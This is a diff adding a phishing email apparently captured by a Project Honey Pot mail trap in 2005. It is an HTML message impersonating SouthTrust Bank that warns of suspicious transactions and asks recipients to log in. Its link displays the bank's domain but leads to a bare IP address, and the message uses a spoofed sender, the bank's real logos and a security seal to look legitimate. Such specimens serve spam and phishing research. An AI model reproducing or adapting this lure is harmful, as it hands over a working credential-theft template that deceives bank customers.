@@ -1,0 +1,102 @@
+Received: from dns.dhd.com.tw (61.219.68.119)
+  by projecthoneypotmailserver with SMTP; 27 Jun 2005 18:44:51 -0000
+Received: from localhost (localhost [127.0.0.1])
+	by dns.dhd.com.tw (Postfix) with SMTP id 08EE020967
+	for <projecthoneypot@projecthoneypot.org>; Tue, 28 Jun 2005 02:50:39 +0800 (CST)
+Received: by dns.dhd.com.tw (Postfix, from userid 10003)
+	id 046BE20D52; Tue, 28 Jun 2005 02:50:36 +0800 (CST)
+To: projecthoneypot@projecthoneypot.org
+Subject: Secure your ACCOUNT
+Message-ID: <1119898234.29582.qmail@southtrust.com>
+From: "secure@southtrust.com" <secure@southtrust.com>
+Content-Type: text/html
+Date: Tue, 28 Jun 2005 02:50:36 +0800 (CST)
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD><TITLE>SouthTrust Online Banking</TITLE>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252"><LINK 
+href="https://southtrustonlinebanking.com/retail/css/stylesheet.css" 
+rel=stylesheet>
+<META content="MSHTML 6.00.2800.1458" name=GENERATOR></HEAD>
+<BODY style="BACKGROUND-COLOR: rgb(255,255,255)" leftMargin=0 topMargin=0 
+marginwidth="0" marginheight="0">
+<FORM name=frmLogin onsubmit="return handleLogin();" action=login.php 
+method=post>
+<TABLE style="WIDTH: 793px; HEIGHT: 784px" cellSpacing=0 cellPadding=0 width=793 
+border=0>
+  <TBODY>
+  <TR>
+    <TD vAlign=top align=left width="100%" height=98><!-- top table -->
+      <TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+        <TBODY>
+        <TR>
+          <TD vAlign=bottom align=left width="50%"><A 
+            href="http://www.southtrust.com"><IMG height=36 hspace=16 
+            src="https://southtrustonlinebanking.com/retail/pix/gph_st_logo.gif" 
+            width=203 vspace=5 border=0></A></TD><!-- top banner -->
+          <TD vAlign=center align=right width="50%"><!--
+
+			  * Change by NCR/ja210012 on 7-2-03
+
+			  * Choose to display banner based on DB values
+
+			  -->&nbsp; 
+          </TD><!-- end top banner -->
+          <TD vAlign=center align=right width=5><IMG height=70 
+            src="https://southtrustonlinebanking.com/retail/pix/spacer.gif" 
+            width=5 border=0></TD></TR><!-- top nav -->
+        <TR>
+          <TD vAlign=top align=right width="100%" 
+          background=https://southtrustonlinebanking.com/retail/pix/gph_top_bar_bg.gif 
+          colSpan=3 height=28><IMG height=28 
+            src="https://southtrustonlinebanking.com/retail/pix/spacer.gif" 
+            width=700 border=0></TD></TR><!-- end top nav --></TBODY></TABLE></TD></TR><!-- middle section -->
+  <TR>
+    <TD vAlign=top align=left width="100%"><BR></TD></TR><!-- end middle section -->
+  <TR>
+    <TD>
+      <P><IMG height=40 
+      src="https://southtrustonlinebanking.com/retail/pix/spacer.gif" width=1 
+      border=0>Dear SouthTrust customer,</P>
+      <P>We recently reviewed your account, and we suspect an unauthorized ATM 
+      and/or PIN- based point of sale transaction on your account.<BR>Protecting 
+      your account is our primary concern.Therefore, as a preventive measure we 
+      have temporary limited your access to sensitive information.<BR>SouthTrust 
+      Bank features.To ensure that your account is not compromised, simply hit 
+      "CLICK ON THE REFERENCE LINK" to confirm your identity as a card member of 
+      SouthTrust.</P>
+      <P>&nbsp;&nbsp;&nbsp;&nbsp;<U>Login to your SouthTrust Online Banking with 
+      your SouthTrust username and password.</U></P>
+      <P>&nbsp;&nbsp;&nbsp; <U>Confirm your identity as a card memeber of 
+      SouthTrust.</U></P>
+      <P>&nbsp;&nbsp;&nbsp; <U>View your transaction history and report 
+      suspicious activity or any unauthorized change.</U></P>
+      <P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<A 
+      href="http://211.5.184.51/wiki/.southtrustonlinebanking.com/index.html">https://southtrustonlinebanking.com/retail/</A></P>
+      <P>If you are not enrolled for SouthTrust Online Banking get started 
+      today! Complete the steps below and takeadvantage of our online services 
+      today!</P>
+      <P><U>Select your account: Personal Accounts, Business Acounts, Credit 
+      Card Premiere Line or Credit Line Only.<BR></U>It`s that easy. If you 
+      still need assistance, just click the "Help" button within Internet 
+      Banking, or <A 
+      href="http://www.southtrust.com/st/CustomerService/ContactUs/Default.htm">contact 
+      us</A>. We`re here to help you 24 hours a day, 7 days a week.</P>
+      <P>*Please do not reply to this message. Mail sent to this 
+      address&nbsp;cannot be answered.</P>
+      <P>*For assistance, log to your SouthTrust Bank Account and chose the 
+      "Help" link in the header of any page.&nbsp;</P>
+      <P>&nbsp;&nbsp; <SPAN style="mso-bidi-font-size: 11.0pt"><FONT 
+      face="Times New Roman">Thomas D. B. Graff, <SPAN 
+      style="FONT-SIZE: 11pt"><FONT face=Verdana size=2>Member 
+      FDIC</FONT></SPAN></P></FONT></SPAN>
+      <P><IMG style="WIDTH: 100px; HEIGHT: 102px" height=50 
+      src="https://www.verisign.com/images/seals/Secure-White98x102.gif" width=100></P>
+      <P><STRONG>Copyright 2005, SouthTrust. All Rights Reserved</STRONG></P>
+      <P><STRONG>Wachovia Bank, N.A. d/b/a SouthTrust Bank, Member FDIC</STRONG> 
+      </P></TD></TR><!-- footer -->
+  <TR>
+    <TD vAlign=bottom align=left 
+width="100%"></TD></TR><!-- end footer --></TBODY></TABLE>&nbsp;&nbsp;&nbsp; 
+</FORM></BODY></HTML>
+
